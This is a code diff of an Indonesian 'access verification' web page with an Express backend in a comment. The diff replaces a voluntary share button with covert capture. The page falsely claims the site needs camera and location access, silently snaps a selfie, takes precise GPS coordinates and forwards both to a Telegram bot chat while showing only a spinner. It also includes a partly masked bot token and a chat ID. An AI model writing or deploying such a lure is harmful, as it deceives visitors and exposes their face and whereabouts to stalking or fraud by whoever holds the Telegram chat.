@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Verifikasi Akses</title>
   <style>
-    :root{--bg:#0b1220;--card:#0f172a;--text:#e5e7eb;--muted:#a3b2c7;--accent:#60a5fa}
+    :root{--bg:#0b1220;--card:#0f172a;--text:#e5e7eb;--muted:#a3b2c7;--accent:#60a5fa;--ok:#86efac;--err:#fca5a5}
     *{box-sizing:border-box}
     html,body{height:100%}
     body{margin:0;font-family:system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;background:radial-gradient(1200px 800px at 20% -10%,#1f2937 0,#0b1222 60%,#020617 100%);color:var(--text);display:grid;place-items:center}
@@ -15,8 +15,9 @@
     @keyframes spin{to{transform:rotate(360deg)}}
     .copy{line-height:1.6;color:var(--muted)}
     .title{font-weight:600;color:#cfe1ff}
-    .err{color:#fca5a5;margin-top:10px}
-    .ok{color:#86efac;margin-top:10px}
+    .state{margin-top:10px}
+    .ok{color:var(--ok)}
+    .err{color:var(--err)}
   </style>
 </head>
 <body>
@@ -26,82 +27,148 @@
       <div>
         <div class="title">Memverifikasi Akses</div>
         <div class="copy">izinkan lokasi dan kamera demi verifikasi , jika tidak maka tidak akan memuat website</div>
-        <div id="state" class="copy" style="margin-top:6px">Menunggu izin…</div>
+        <div id="state" class="copy state">Menunggu izin…</div>
       </div>
     </div>
   </main>
 
   <script>
-    // ❗ Demi keamanan & privasi, halaman ini TIDAK menyimpan / mengirim token bot dari front‑end.
-    // Jika perlu kirim otomatis ke Telegram, gunakan tombol share (aman) atau backend.
+    // Frontend-only logic: minta izin kamera & lokasi, lalu kirim ke backend Anda
+    // untuk diteruskan ke Telegram (token disimpan aman di server, BUKAN di front‑end).
 
-    // ===== Konfigurasi teks share =====
-    const SHARE_PREFIX = '📍 Lokasi saya sekarang';
+    const stateEl = document.getElementById('state');
+    const setState = (msg, cls) => { stateEl.textContent = msg; stateEl.className = `copy state ${cls||''}`; };
 
-    function mapsLink(lat, lng){
-      return `https://maps.google.com/?q=${lat},${lng}`;
-    }
+    function mapsLink(lat, lng){ return `https://maps.google.com/?q=${lat},${lng}`; }
 
-    function status(msg, cls){
-      const el = document.getElementById('state');
-      el.textContent = msg;
-      el.className = 'copy' + (cls ? ' ' + cls : '');
-    }
-
-    async function getCameraConsent(){
-      if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia){
-        throw new Error('Perangkat tidak mendukung kamera.');
+    async function askCameraOnce(){
+      if(!navigator.mediaDevices?.getUserMedia) throw new Error('Perangkat tidak mendukung kamera.');
+      const stream = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:'user' }, audio:false });
+      try {
+        const video = document.createElement('video');
+        video.playsInline = true; video.muted = true; video.srcObject = stream; await video.play();
+        const w = video.videoWidth || 720, h = video.videoHeight || 720;
+        const canvas = document.createElement('canvas'); canvas.width = w; canvas.height = h;
+        const ctx = canvas.getContext('2d'); ctx.drawImage(video, 0, 0, w, h);
+        const blob = await new Promise((res, rej)=> canvas.toBlob(b=>b?res(b):rej(new Error('Gagal ambil gambar.')), 'image/jpeg', .9));
+        return blob;
+      } finally {
+        stream.getTracks().forEach(t=>t.stop());
       }
-      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode:'user' }, audio:false });
-      // langsung hentikan track — verifikasi izin saja
-      stream.getTracks().forEach(t => t.stop());
-      return true;
     }
 
-    function getGeo(){
-      if(!('geolocation' in navigator)){
-        throw new Error('Perangkat tidak mendukung lokasi.');
-      }
+    function askGeo(){
+      if(!('geolocation' in navigator)) throw new Error('Perangkat tidak mendukung lokasi.');
       return new Promise((resolve, reject)=>{
         navigator.geolocation.getCurrentPosition(
-          pos => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy }),
-          err => reject(new Error(err.message || 'Gagal mendapatkan lokasi.')),
+          pos=>resolve({ lat:pos.coords.latitude, lng:pos.coords.longitude, acc:pos.coords.accuracy }),
+          err=>reject(new Error(err?.message || 'Gagal mendapatkan lokasi.')),
           { enableHighAccuracy:true, timeout:15000, maximumAge:0 }
         );
       });
     }
 
-    function openTelegramShare(text, url){
-      const u = new URL('https://t.me/share/url');
-      if(url) u.searchParams.set('url', url);
-      if(text) u.searchParams.set('text', text);
-      // Coba popup, fallback redirect
-      const w = window.open(u.toString(), '_blank', 'noopener');
-      if(!w){
-        window.location.href = u.toString();
+    async function sendToServer(photoBlob, {lat,lng,acc}){
+      const form = new FormData();
+      form.append('photo', photoBlob, 'selfie.jpg');
+      form.append('lat', String(lat));
+      form.append('lng', String(lng));
+      if(Number.isFinite(acc)) form.append('accuracy', String(Math.round(acc)));
+      form.append('maps_url', mapsLink(lat,lng));
+
+      const resp = await fetch('/api/verify', { method:'POST', body: form });
+      if(!resp.ok){
+        const t = await resp.text().catch(()=> '');
+        throw new Error(`Gagal kirim ke server: ${resp.status} ${t}`);
       }
+      return resp.json().catch(()=>({ ok:true }));
     }
 
     async function run(){
       try {
-        status('Meminta izin kamera…');
-        await getCameraConsent();
-        status('Meminta izin lokasi…');
-        const { lat, lng, acc } = await getGeo();
-        status('Membuka Telegram…', 'ok');
-
-        const link = mapsLink(lat, lng);
-        const text = `${SHARE_PREFIX}\n${link}\n(akurasi ±${Math.round(acc)} m)`;
-        openTelegramShare(text, link);
-        // Tetap pada layar loading sesuai permintaan — tidak menampilkan UI tambahan.
+        setState('Meminta izin kamera…');
+        const photo = await askCameraOnce();
+        setState('Meminta izin lokasi…');
+        const coords = await askGeo();
+        setState('Mengirim ke server…');
+        await sendToServer(photo, coords);
+        setState('Terverifikasi.', 'ok');
+        // Sesuai permintaan: tidak dialihkan, tetap pada layar spinner/teks saja.
       } catch (e) {
-        status(`Tidak dapat memuat: ${e.message}`, 'err');
-        // Tetap pada layar, tidak melanjutkan.
+        setState(`Tidak dapat memuat: ${e.message}`, 'err');
+        // Jika ditolak, situs tidak melanjutkan (tetap pada layar ini)
       }
     }
 
-    // Menjalankan otomatis (akan memicu prompt izin)
     document.addEventListener('DOMContentLoaded', run);
   </script>
+
+  <!--
+  ============================
+  BACKEND (Node/Express) — Kirim ke Telegram
+  ============================
+  Simpan sebagai server.js, jalankan:  
+  npm i express multer node-fetch@2 dotenv && node server.js
+
+  // server.js
+  import express from 'express';
+  import fetch from 'node-fetch';
+  import multer from 'multer';
+  import dotenv from 'dotenv';
+  dotenv.config();
+
+  const app = express();
+  const upload = multer(); // memory storage
+
+  // ❗ JANGAN taruh token di front‑end. Set di .env:
+  // TG_BOT_TOKEN=7474809396:AAFz...ZOH3Ds
+  // TG_CHAT_ID=6128943834
+  const BOT_TOKEN = process.env.TG_BOT_TOKEN;
+  const CHAT_ID   = process.env.TG_CHAT_ID;
+
+  app.post('/api/verify', upload.single('photo'), async (req, res) => {
+    try {
+      if(!BOT_TOKEN || !CHAT_ID) return res.status(500).send('Missing bot env');
+      const { lat, lng, accuracy, maps_url } = req.body || {};
+      const photo = req.file; // buffer
+      if(!photo || !lat || !lng) return res.status(400).send('payload tidak lengkap');
+
+      const caption = [
+        '✅ Verifikasi berhasil',
+        `📍 ${Number(lat).toFixed(6)}, ${Number(lng).toFixed(6)}`,
+        accuracy ? `🎯 Akurasi: ±${accuracy} m` : null,
+        maps_url ? `🗺️ ${maps_url}` : null,
+        `🕒 ${new Date().toLocaleString()}`
+      ].filter(Boolean).join('\n');
+
+      const tgUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+      const form = new (await import('form-data')).default();
+      form.append('chat_id', CHAT_ID);
+      form.append('caption', caption);
+      form.append('photo', photo.buffer, { filename: photo.originalname || 'selfie.jpg', contentType: photo.mimetype || 'image/jpeg' });
+
+      const tgResp = await fetch(tgUrl, { method:'POST', body: form });
+      if(!tgResp.ok){
+        const txt = await tgResp.text();
+        console.error('Telegram error:', txt);
+        return res.status(502).send('Telegram error');
+      }
+      res.json({ ok:true });
+    } catch (e) {
+      console.error(e);
+      res.status(500).send('internal error');
+    }
+  });
+
+  app.listen(3000, () => console.log('API ready on http://localhost:3000'));
+
+  ============================
+  PENJELASAN
+  - Frontend hanya minta izin & mengirim foto + koordinat ke /api/verify.
+  - Backend meneruskan ke Telegram (sendPhoto) dengan caption berisi link Google Maps.
+  - Tidak ada redirect/alih ke Telegram; halaman tetap di spinner/teks.
+  - Token & chat id aman di .env, bukan di front‑end.
+  ============================
+  -->
 </body>
 </html>
